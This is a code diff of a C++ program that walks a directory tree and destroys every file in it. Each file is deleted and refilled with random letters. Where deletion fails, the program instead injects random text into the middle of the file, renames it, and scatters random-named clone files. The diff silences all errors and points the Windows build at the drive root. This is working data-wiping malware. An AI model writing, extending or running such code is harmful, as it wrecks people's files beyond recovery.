@@ -10,9 +10,7 @@ using namespace std;
 
 
 char random_char() {
-    const char charset[] =
-        "abcdefghijklmnopqrstuvwxyz"
-        "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    const char charset[] = "abcdefghijklmnopqrstuvwxyz";
     int len = sizeof(charset) - 1;
     return charset[rand() % len];
 }
@@ -27,30 +25,77 @@ string get_code(int length) {
 }
 
 bool rename_file_and_get_status(const fs::path& old_path, const fs::path& new_path) {
-    if (std::rename(old_path.c_str(), new_path.c_str()) == 0) {
-        // Rename succeeded, rename back to original
+    try {
+        fs::rename(old_path, new_path);
         return true;
     }
-    return false;
+    catch (...) {
+        return false;
+    }
 }
 
-bool create_new_file(const fs::path& the_new_path) {
-    ofstream new_clone_file(the_new_path);
-    if (new_clone_file) {
-        new_clone_file << get_code(100);
-        new_clone_file.close();
-        return true;
+void create_new_file(const fs::path& the_new_path) {
+    try {
+        ofstream new_clone_file(the_new_path);
+        if (new_clone_file) {
+            new_clone_file << get_code(100);
+            new_clone_file.close();
+        }
     }
-    return false;
+    catch (...) {}
 }
 
 void many_clone_files(const fs::path& the_path, int origin_file_length, const fs::path& origin_file_extension, int file_amount) {
-    int counter = 0;
-     while(counter < 10) {
-        string new_file_with_extension = get_code(origin_file_length) + origin_file_extension.string();
-        const fs::path& the_new_path = the_path.parent_path() / new_file_with_extension;
-        bool wild_card = create_new_file(the_new_path);
-        counter++;
+    try {
+        int counter = 0;
+        while(counter < 10) {
+            string new_file_with_extension = get_code(origin_file_length) + origin_file_extension.string();
+            const fs::path& the_new_path = the_path.parent_path() / new_file_with_extension;
+            create_new_file(the_new_path);
+            counter++;
+        }
+    }
+    catch (...) {}
+}
+
+streamsize get_file_size(const fs::path& filepath) {
+    try {
+        ifstream file(filepath, std::ios::binary | std::ios::ate);
+        if (!file) return -1;
+        return file.tellg();
+    }
+    catch (...) {
+        return -1;
+    }
+}
+
+void write_in_middle(const fs::path& filepath) {
+    try {
+        streamsize size = get_file_size(filepath);
+        if (size == -1) {
+            //
+        };
+        
+        streamsize middle_pos = size / 2;
+        
+        ifstream read_file(filepath, std::ios::binary);
+        if (!read_file) {
+            //
+        };
+        read_file.seekg(middle_pos);
+        string tail_content((istreambuf_iterator<char>(read_file)), istreambuf_iterator<char>());
+        read_file.close();
+        
+        fstream file(filepath, std::ios::in | std::ios::out);
+        if (!file) {
+            //
+        }
+        file.seekp(streampos(middle_pos));
+        file << get_code(100) << tail_content;
+        file.close();
+    }
+    catch (...) {
+        //
     }
 }
 
@@ -67,35 +112,14 @@ void path_finder(const fs::path& p) {
                 const fs::path& new_path = the_path.parent_path() / new_file_with_extension;
                 try {
                     fs::remove(the_path);
-                    bool clone = create_new_file(the_path);
-                    many_clone_files(the_path, origin_file_length, origin_file_extension, 10);
+                    create_new_file(the_path);
                 }
-                //if error in deletion
                 catch (...) {
-                    //check file is able to write
-                    bool rename_success = rename_file_and_get_status(the_path, new_path);
-                    if (rename_success) {
-                        bool create_cloning_success = create_new_file(the_path);
-                        many_clone_files(the_path, origin_file_length, origin_file_extension, 100);
+                    write_in_middle(the_path);
+                    if (rename_file_and_get_status(the_path, new_path)) {
+                        create_new_file(the_path);
                     }
-                    //if renaming fails
-                    else {
-                        cout << "Renaming fails!" << endl;
-                    }
-                    // ofstream file(the_path, std::ios::out);
-                    // if (file.is_open()) {
-                    //     for (size_t i = 0; i < 9; ++i) {
-                    //         file << get_code(1000) << "\n";
-                    //         if (file.fail()) {
-                    //             break;
-                    //         }
-                    //     }
-                    //     file.close();
-                    // }
-                    // //when file is not able to write
-                    // else {
-                    //     //
-                    // }
+                    many_clone_files(the_path, origin_file_length, origin_file_extension, 10);
                 }
             }
         }
@@ -107,7 +131,16 @@ void path_finder(const fs::path& p) {
 
 int main() {
     srand(time(0));
-    fs::path p = "/Users/pyisoe/delete_test";
+    fs::path p;
+    #if defined(_WIN32)
+        p = "\\";
+    #elif defined(__APPLE__)
+        p = "/Users/pyisoe/skdlfjsdkfjsd/"; 
+    #elif defined(__linux__)
+        p = "/home/youruser/delete_test";
+    #else
+        #error "OS is not in the list."
+    #endif
     path_finder(p);
     return 0;
 }
